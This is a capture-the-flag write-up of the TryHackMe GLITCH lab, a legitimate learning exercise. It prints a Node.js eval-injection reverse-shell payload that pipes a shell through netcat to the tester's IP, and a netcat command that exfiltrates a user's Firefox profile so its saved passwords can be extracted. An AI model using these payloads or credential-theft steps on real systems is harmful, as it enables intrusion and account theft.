**<p align="center">TryHackMe: GLITCH</p>**
---

<p align="center">
<img
src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/room%20icon.jpeg" alt="image alt" width="150" />
</p>

[![Day 25 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2025%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)

**Topic:** Web application pentesting

**Completed:** 8/5/2025

“Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?”

<p align="center">+++++++++</p>

Starting of with an `Nmap -sV -sC` scan, I discovered one open TCP port:

80/tcp open  http    nginx 1.14.0 (Ubuntu)

Navigating to the IP address in a web browser led to a blank, glitched homepage titled "not allowed."

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%201.png)

To enumerate directories, I used Gobuster, which revealed a `/secret` path. However, accessing it loaded the same static homepage, suggesting some kind of access control, filtering, or client-side logic at play.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%202.png)

Inspecting the page’s source code, I noticed a JavaScript function that stood out:
```
 <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
```
This function references a `/api/access` endpoint that returns JSON data, hinting at a potential way to bypass the restricted page or access hidden content.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%203.png)

Visiting `http://10.201.69.248/api/access` directly in the browser returned what looked like a Base64-encoded token.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%204.png)

I decoded the token using an online Base64 decoder, revealing a plaintext string, likely an authentication token or key. This value could potentially be used for authentication, header injection, or accessing other areas of the site.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%205.png)

Going back to `http://10.201.69.248/api/access`, I explored the page further using Firefox's Inspect Element tool. Under the `Storage` tab, I noticed a cookie named `token` with a `value` field that seemed relevant. I attempted to manually update the token's value using the previously decoded Base64 string, hoping it would grant access or reveal new content.

However, Firefox’s Content Security Policy (CSP) blocked any content that may have been intended to load with the updated token. This made it difficult to verify whether the token had any actual effect on the page or not.

After some troubleshooting attempts with no success, I decided to pivot and try a different approach.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%206.png)

Next, I visited `http://10.201.69.248/api` to explore further, but it only returned a message saying: “Cannot GET /api”.

To investigate further, I ran Gobuster to enumerate hidden directories. This revealed a new endpoint: `/items`.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%207.png)

Navigating to `http://10.201.69.248/api/items` presented a list of three categories: `sins`, `errors`, and `deaths`. While I wasn’t yet sure what these were used for, I made a note of them for later reference.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%208.png)

Following the hint provided in the TryHackMe room, I used the terminal to run a `curl -X POST` command to interact with the API endpoint and see how it would respond to POST requests. The response returned a message:
```
{"message":"there_is_a_glitch_in_the_matrix"}
```

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%209.png)

Next, I ran Wfuzz on the `/api/items` path to fuzz for any interesting query parameters. The command I used was:
```
wfuzz -X POST -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt -hc 404,400 http://10.201.10.25/api/items?FUZZ=oops
```

This command sends a POST request, substituting the `FUZZ` keyword with values from the wordlist. The `-hc 404,400` option filters out common error responses, allowing me to focus on meaningful results.

From this scan, I discovered a parameter named `cmd`, which suggested the potential for command injection or even code execution.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2010.png)

To test this further, I sent another POST request using:
```
curl -X POST http://10.201.10.25/api/items?cmd=test
```

The response confirmed that the `cmd` parameter is indeed vulnerable. It appears the value of `cmd` is passed directly into an `eval()` function on the server side, a major security flaw, as this allows arbitrary JavaScript code to be executed.

When I sent `cmd=test`, the server attempted to evaluate `test` as a variable or function name. Since it was undefined, a `ReferenceError` was thrown.

The behavior indicated that the API is vulnerable to Remote Code Execution (RCE) via JavaScript injection.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2011.png)

With that in mind, I researched a command to exploit this vulnerability and found the following payload:
```
cmd=require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.69.31 47329 >/tmp/f')
```
This command sets up a reverse shell by creating a named pipe (`/tmp/f`) and using `netcat` to connect back to my machine on port `47329`. It allows me to execute a shell remotely, providing interactive access to the target system.

**Note:** Once the payload is modified, it will need to be URL encoded because it contains special characters that could otherwise be misinterpreted or blocked by the server when sent as part of the HTTP request.

I then set up a Netcat listener on port `47329`, URL encoded the payload, and attached it to a `curl` POST request, exploiting the vulnerable `?cmd=` parameter.
Submitting the POST request successfully granted me a reverse shell!

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2012.png)

From there, it was a smooth step to retrieve the `user.txt` flag located in the user’s home directory.

To make the shell more stable and interactive, I used the following command:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2013.png)

To list the binaries that have the potential to be exploited, I used the following command: 
```
find / -perm -4000 -type f 2>/dev/null
```

After some research, I learned a bit about the /usr/local/bin/doas binary. It stood out as the easiest to exploit because it had the SUID bit set and allowed command execution as the root user without requiring a password. doas is similar to sudo, but it's a simpler privilege escalation tool commonly used in BSD-like systems.

<p align="center">+++++++++</p>

<p align="center">✨Research Deep-Dive✨</p>

BSD (Berkeley Software Distribution) is a type of Unix. Systems such as FreeBSD, OpenBSD, NetBSD, and DragonFly BSD are considered BSD-like because they come directly from the original BSD Unix. While both Linux and BSD are Unix-like and behave similarly in many ways, they come from different lineages and have distinct design architectures.

<p align="center">+++++++++</p>

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2014.png)

Next, I used the `cat /etc/passwd` command to list all the system’s user accounts. This helped confirm which users existed on the machine and gave me insight into the system’s structure and potential targets for privilege escalation.

The user `v0id` stood out to me because it had a valid shell (`/bin/bash`) and an assigned home directory, indicating it was likely a real user account rather than a system service.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2015.png)

I attempted to switch to the `v0id` user but was unsuccessful. So, I moved on to exploring their home directory. I listed its contents and checked for hidden files using the `ls -la` command. Among the hidden items, a `.firefox` directory caught my attention.

Since I hadn’t encountered a `.firefox` file in a privilege escalation context before, I sought some help at this stage to better understand how it could be exploited.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2016.png)

The next step was to use the `tar` tool to archive the `.firefox` directory into a `.tgz` file for easier transfer to my local machine using Netcat. Archiving the directory preserves its structure and content, which is useful when analyzing locally.

I used the following command:
```
tar -cvf firefox.tgz .firefox
```

This created a compressed archive named `firefox.tgz` containing the `.firefox` directory.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2017.png)

I then set up a Netcat listener on port `3211` to receive the `firefox.tgz` file from the targeted machine by running:
 ```
nc -lvnp 3211 > firefox.tgz
```

On the target machine, I used the following command to send over the file to my local machine: 
```
nc 10.201.69.31 3211 < firefox.tgz
```

This allowed me to successfully retrieve the `.firefox` contents.

**Disclaimer:** I unfortunately missed capturing a screenshot during the actual file transfer, so I edited the steps into the screenshot to demonstrate what was done, how, and the results.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2018.png)

Next, I used the following command from my local machine to extract and view the contents of the firefox.tgz file:
```
tar -xvzf firefox.tgz
```

This revealed a directory named `.firefox/b5w4643p.default-release/`, which is recognizable as a Firefox profile folder.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2019.png)

<p align="center">+++++++++</p>

<p align="center">✨Research Deep-Dive✨</p>

Firefox profiles typically follow this naming format:
```
<random_string>.<profile_name>/
```
The random string (like `b5w4643p`) is automatically generated by Firefox.

The profile name (like `default-release`) indicates the user’s profile, often set to `default-release` for standard configurations.


Inside this profile folder, you’ll often find files and directories such as:
- `places.sqlite` (browsing history and bookmarks)

- `logins.json` and `key4.db` (saved credentials)

- `cookies.sqlite`, `prefs.js`, `sessionstore.jsonlz4`, etc.

These are all indicators that the folder belongs to a Firefox user profile. Identifying it helps you locate sensitive data such as saved passwords, browsing activity, or session information.

<p align="center">+++++++++</p>

To load the extracted Firefox profile locally, I used:
```
firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
```

The `--allow-downgrade` flag was included to avoid any compatibility issues with older profile versions. 

Once the browser launched using the profile, I navigated to `about:logins`, where Firefox stores saved login credentials. The profile loaded was named `glitch.thm`, and it contained the saved username and password for `v0id`. 

I copied the password from there and used it to switch to the `v0id` user on the target machine.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2020.png)

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2021.png)

Finally, by exploiting the `/usr/local/bin/doas` binary, I used the command `doas -u root /bin/bash` along with the `v0id` user’s password to escalate my privileges to root.

From there, grabbing the `root.txt` file from the root directory was a piece of cake!

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/GLITCH/Images/Screenshot%2022.png)

<p align="center">+</p>

**Lessons Learned:**

At first, I wasn’t particularly enjoying this box, too many areas felt like dead ends. But the experience became a lot more interesting once I reached the part involving the `.firefox` directory and Firefox profile. I learned how the Firefox credentials can be stored and retrieved from browser configurations, and how that information can be leveraged for privilege escalation. Those parts were the coolest. This was another challenging box that, in the end, I learned to respect. I won’t forget the methods I picked up while cracking it. From a beginner’s perspective, I’d say this box shouldn’t be rated as “easy”, it leaned more towards medium in difficulty.

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers directly. Instead, I’ve documented my full process to support both others and myself in understanding the vulnerability.

**Resources**:
- [TryHackMe's GLITCH Room](https://tryhackme.com/room/glitch)
- [GTFOBins](https://gtfobins.github.io/)
